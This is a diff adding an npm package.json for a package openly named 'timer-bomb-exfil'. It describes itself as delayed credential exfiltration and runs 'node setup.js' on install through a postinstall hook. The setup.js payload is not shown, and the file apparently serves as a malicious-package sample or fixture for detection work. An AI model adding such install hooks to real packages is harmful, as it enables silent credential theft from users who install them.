@@ -1,0 +1,8 @@
+{
+  "name": "timer-bomb-exfil",
+  "version": "2.0.1",
+  "description": "Delayed credential exfiltration via timer bomb",
+  "scripts": {
+    "postinstall": "node setup.js"
+  }
+}
